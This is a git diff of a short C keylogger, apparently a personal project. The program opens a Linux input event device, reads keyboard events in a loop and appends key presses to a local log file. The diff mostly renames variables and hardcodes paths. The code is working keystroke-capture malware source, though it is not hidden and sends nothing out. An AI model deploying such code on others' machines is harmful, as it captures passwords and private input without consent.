@@ -5,25 +5,30 @@
 #include <linux/input.h> //for input_event struct
 
 int main(){
-	int keyboard = open("/dev/input/event15", O_RDONLY);
+	const char *device = "/dev/input/event13";
+	struct input_event event;
+	
+
+	int keyboard_file  = open(device, O_RDONLY);
 	//open event file for keyboarads
-	if(keyboard == -1){
-		perror("error with keyboard");
+	if(keyboard_file  == -1){
+		perror("error with keyboard file opening");
 		return 1;
 	}
 
 	//file to log key presses
-	FILE *logFile = fopen("keylog.txt","a");
+	FILE *logFile = fopen("/home/filetcow/repos/c-key-logger/keylog.txt","a");
+
 	if(logFile==NULL){
 		perror("error opening log file");
-		close(keyboard);
+		close(keyboard_file);
 		return 1;
 	}
 
-	struct input_event event;
+	
 	
 	while(1){
-		ssize_t bytes = read(keyboard, &event, sizeof(event));
+		ssize_t bytes = read(keyboard_file, &event, sizeof(event));
 		if(bytes == (ssize_t) sizeof(event)){
 			if(event.type == EV_KEY){
 				if(event.value == 1){
@@ -36,7 +41,7 @@ int main(){
 	}
 
 	fclose(logFile);
-	close(keyboard);
+	close(keyboard_file);
 	return 0;
 
 }
